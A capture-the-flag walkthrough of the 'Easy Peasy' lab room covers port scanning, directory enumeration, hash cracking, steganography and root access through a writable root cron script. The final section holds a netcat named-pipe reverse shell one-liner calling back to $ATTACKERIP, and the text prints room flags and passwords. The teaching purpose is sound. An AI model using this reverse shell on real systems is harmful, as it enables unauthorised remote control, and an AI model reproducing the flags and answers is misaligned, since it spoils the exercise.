# Easy Peasy

![image](https://github.com/user-attachments/assets/1491e1ff-41b5-4852-a05f-f73624d5efa5)

## Rustscan
First lets start off by scanning the machine for open ports. Use this command:
```
rustscan -a $IP
```
![image](https://github.com/user-attachments/assets/9528c9f9-b8b5-48c9-b513-93bebb0e01ca)

We can see that theres 3 open ports, 80,6498, and 65524. 

**How many ports are open?** 3


To get further information on these ports, use this nmap command:
```
nmap -A -vv -p80,6498,65524 $IP
```
![image](https://github.com/user-attachments/assets/bf17467c-58c6-4e58-8d2c-ca8e40331b33)

We can see at the top that the version of nginx that is running is 1.16.1 and that the service running on port 65524 is Apache.

**What is the version of nginx?** 1.16.1

**What is running on the highest port?** Apache

Now we can start enumerating the machine. 


## Gobuster

Visiting `http://$IP` we are met with the main page saying, "Welcome to nginx!" Checking the source code doesn't show us anything interesting.

![image](https://github.com/user-attachments/assets/ddadb9a3-aff9-4948-85c3-5b113c35718c)

Visiting robots.txt also doesnt show us anything interesting.

![image](https://github.com/user-attachments/assets/d595029a-c806-45e4-811b-6c218dc86953)

Lets start finding hidden directories from this main page. Use this command:
```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```
We found a hidden directory named "hidden"

![image](https://github.com/user-attachments/assets/6e859066-8858-40af-b3bc-e2cfa654f6be)

Visiting this page just shows us a random image

![image](https://github.com/user-attachments/assets/0088444f-56f6-4ddf-8e31-d7b85f309f96)

Lets enumerate further.
```
gobuster dir -u http://$IP/hidden -w /usr/share/wordlists/dirb/common.txt
```

![image](https://github.com/user-attachments/assets/223245ba-2853-4d56-be25-c1d45f3cb2e4)

Now we can see that there is another directory named "whatever" Visiting this page shows us an image of a person on some sort of mountain. What's really interesting is the source code.

![image](https://github.com/user-attachments/assets/587ef34d-cf1f-42c7-8972-3268807836b5)

We can see that there is a base64 encoded string inside of the source code. Decoding this on [this website](https://www.base64decode.net/) gives us the first flag.

**Flag 1**: flag{f1rs7_fl4g}

Now lets visit the other webpage using the URL `http://$IP:65524`. Visiting this greets us with the default welcome page for Apache2 web servers. The first thing we should do is visit the robots.txt page. 

![image](https://github.com/user-attachments/assets/08daf432-292f-4f1a-97aa-26be36c98a26)

We can see that there is a hash here. This hash is an md5 hash and only ONE website can decode this hash. This is the [website](https://md5hashing.net/). Once we put the hash into this website, we can see that it gave us a flag. Be patient as it takes a while.

![image](https://github.com/user-attachments/assets/4d6d9e0b-f8c8-4969-b9d1-421e6c8ed137)


**Flag 2**: flag{1m_s3c0nd_fl4g}

Viewing the source code, we can find many interesting things. The first of which is this encoded string.

![image](https://github.com/user-attachments/assets/692fc7b3-56a0-45b0-b86b-c8cede82eeb9)

Putting this string into a [cipher identifier](https://www.dcode.fr/cipher-identifier), we can see that its a base62 string. Decoding this we get a hidden directory `/n0th1ng3ls3m4tt3r`

**What is the hidden directory?** /n0th1ng3ls3m4tt3r

Before we visit this directory, we can find something else interesting in the source code. 

![image](https://github.com/user-attachments/assets/2871b5d5-e015-4b90-9cc9-e7ac0ca07c3c)

We got the third flag!!

**Flag 3**: flag{9fdafbd64c47471a8f54cd3fc64cd312}

Now we can visit the hidden directory. Visiting `http://$IP/n0th1ng3ls3m4tt3r` we are met with an image. Viewing the source code of this page, we can see that there is another hash. 

![image](https://github.com/user-attachments/assets/5a30796f-6676-4171-b767-5b0d483ff726)

The hint for the 5th question tells us to use the wordlist we downloaded from the task files and to use John the ripper to crack this hash. I used hashcat since I am more familiar with it. I used this command:
```
hashcat -a 0  -m 6900 hash easypeasy_1596838725703.txt
```

![image](https://github.com/user-attachments/assets/3b7a15ee-c643-4df2-8f73-d0c2996a279b)

**Using the wordlist that provided to you in this task crack the hash
what is the password?** mypasswordforthatjob

We can use this password against the image we found in the hidden page using steghide. Use this command:
```
steghide extract -sf binarycodepixabay.jpg
```
When it prompts for a password, use the password we cracked with hashcat. After putting this in, we get a file called `secrettext.txt`. After opening this file, we are met with ssh credentials!

![image](https://github.com/user-attachments/assets/92a37298-0e2b-4d16-a3e6-e742688574f8)

But the password is in binary... This is no problem. We can visit [this website](https://www.rapidtables.com/convert/number/binary-to-ascii.html) and input the binary values to get the password.

**What is the password to login to the machine via SSH?** iconvertedmypasswordtobinary

Now we have the username and password for ssh. 

## Privilege Escalation

 First use this command to log into ssh:
 ```
ssh boring@$IP -p 6498
```
We're in!

![image](https://github.com/user-attachments/assets/e1492cde-46f9-4de2-b2a8-3adf608bfcaf)

We can get user.txt by running `cat user.txt`

![image](https://github.com/user-attachments/assets/aa33a9f2-fcf1-48a7-b22a-8cf052229bf7)

It's rotated... We can solve this too. We can dechipher this by visiting [cyberchef](https://gchq.github.io/CyberChef/#recipe=ROT13_Brute_Force(true,true,false,100,0,true,'')&input=c3ludHthMGp2Z2YzM3pmYTBlejR5fQ0K&ieol=CRLF) and choosing rot13 bruteforce.

![image](https://github.com/user-attachments/assets/09f54f21-e07d-47b8-8339-efc05d43605d)

**user.txt**: flag{n0wits33msn0rm4l}

In the room description, it said that there was a vulnerable cronjob we have to exploit to get root. Running `cat /etc/crontab` we can see that there is a bash script that runs every minute as root.

![image](https://github.com/user-attachments/assets/2017bdd1-399a-4452-9369-426e4f4bc339)

Let's check if its writable.

![image](https://github.com/user-attachments/assets/9139b67c-d265-4a9c-b79c-eced28c61847)

Its writable! We can exploit this to get root. First, I will set up a netcat listener on my host machine with `nc -lvnp 53`. You can choose any port but I prefer port 53. Once this is set up, run `nano .mysecretcronjob.sh` on the ssh machine and copy and paste this script in:
```
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKERIP 53 >/tmp/f
```
After putting this in, we wait one minute on our netcat listener and we get root.

![image](https://github.com/user-attachments/assets/ab460d07-66ce-4b5b-acd1-448d076e91d7)

We are root! Run `cat /root/.root.txt` to get the root flag

**Root Flag**: flag{63a9f0ea7bb98050796b649e85481845}

Congratulations! You completed the room!
